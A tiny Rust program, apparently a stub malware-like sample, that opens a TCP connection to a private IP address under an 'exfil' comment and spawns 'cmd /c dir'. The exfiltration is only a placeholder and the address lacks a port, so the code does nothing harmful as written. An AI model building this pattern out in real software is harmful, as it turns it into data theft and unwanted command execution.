use std::net::TcpStream;
use std::process::Command;
fn main() {
    if let Ok(_s) = TcpStream::connect("192.168.1.1") { /* exfil */ }
    Command::new("cmd").arg("/c").arg("dir").spawn().ok();
}
